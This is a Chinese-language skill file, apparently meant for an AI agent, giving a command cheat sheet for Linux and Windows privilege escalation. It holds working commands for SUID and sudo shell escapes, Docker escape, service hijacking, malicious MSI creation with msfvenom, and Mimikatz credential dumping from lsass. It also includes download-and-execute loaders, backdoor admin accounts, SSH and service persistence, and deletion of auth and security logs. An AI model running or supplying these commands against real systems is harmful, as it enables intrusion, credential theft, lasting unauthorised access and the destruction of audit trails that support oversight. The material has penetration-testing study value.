---
name: priv-escalation
description: 权限提升技术，包括 Linux 和 Windows 系统的提权方法
---

# 权限提升技能

用于在获得初始访问后提升到 root/SYSTEM 权限。

## Linux 提权

### 1. SUID 二进制文件
```bash
# 查找 SUID 文件
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# 常见可利用的 SUID 程序
# find
find / -exec /bin/sh \; -quit

# vim
vim -c ':!/bin/sh'

# less/more
less /etc/passwd
!/bin/sh
```

### 2. Sudo 权限滥用
```bash
# 查看 sudo 权限
sudo -l

# GTFOBins 查找可利用的命令
# https://gtfobins.github.io/

# 示例：sudo vim
sudo vim -c ':!/bin/sh'

# 示例：sudo python
sudo python -c 'import os; os.system("/bin/sh")'
```

### 3. 内核漏洞利用
```bash
# 检查内核版本
uname -a
cat /proc/version

# 搜索已知漏洞
searchsploit linux kernel $(uname -r)

# 常见内核漏洞
# DirtyCow (CVE-2016-5195)
# eBPF (CVE-2021-3490)
# PwnKit (CVE-2021-4034)
```

### 4. Cron 任务劫持
```bash
# 查看 cron 任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 查找可写的 cron 脚本
find /etc/cron* -type f -writable
```

### 5. 敏感文件和凭据
```bash
# 查找配置文件中的密码
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/www/ 2>/dev/null

# 查找 SSH 私钥
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# 历史命令
cat ~/.bash_history
cat ~/.mysql_history
```

### 6. Docker 逃逸
```bash
# 检查是否在容器中
cat /proc/1/cgroup | grep docker

# 特权容器逃逸
fdisk -l
mount /dev/sda1 /mnt
chroot /mnt

# Docker socket 挂载
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Windows 提权

### 1. 服务配置错误
```powershell
# 查找不安全的服务
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.State -eq 'Running'}

# 检查服务权限
sc qc vulnerable-service
accesschk.exe -wuvc vulnerable-service

# 替换服务可执行文件
sc stop vulnerable-service
copy evil.exe "C:\path\to\service.exe"
sc start vulnerable-service
```

### 2. 不带引号的服务路径
```powershell
# 查找
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# 利用
# 如果路径是：C:\Program Files\Some App\service.exe
# 创建：C:\Program.exe 或 C:\Program Files\Some.exe
```

### 3. AlwaysInstallElevated
```powershell
# 检查注册表
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# 如果都设置为1，可以用 MSI 提权
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi > exploit.msi
msiexec /quiet /qn /i exploit.msi
```

### 4. 令牌窃取
```powershell
# 使用 Incognito (Metasploit)
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"

# 使用 RottenPotato/JuicyPotato
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
```

### 5. 密码提取
```powershell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# Procdump + Mimikatz
procdump.exe -accepteula -ma lsass.exe lsass.dmp
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

## 自动化工具

### Linux
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

### Windows
```powershell
# WinPEAS
winpeas.exe

# PowerUp
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks"

# Sherlock
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1');Find-AllVulns"
```

## 提权后操作

1. **添加用户**
   ```bash
   # Linux
   useradd -m -s /bin/bash hacker
   echo "hacker:password" | chpasswd
   usermod -aG sudo hacker
   
   # Windows
   net user hacker P@ssw0rd /add
   net localgroup administrators hacker /add
   ```

2. **建立持久化**
   ```bash
   # SSH 后门
   echo "ssh-rsa YOUR_KEY" >> /root/.ssh/authorized_keys
   
   # Windows 后门服务
   sc create backdoor binpath= "cmd.exe /k C:\backdoor.exe" start= auto
   ```

3. **清理痕迹**
   ```bash
   # 清除日志
   rm -f /var/log/auth.log
   echo > ~/.bash_history
   
   # Windows
   wevtutil cl System
   wevtutil cl Security
   ```
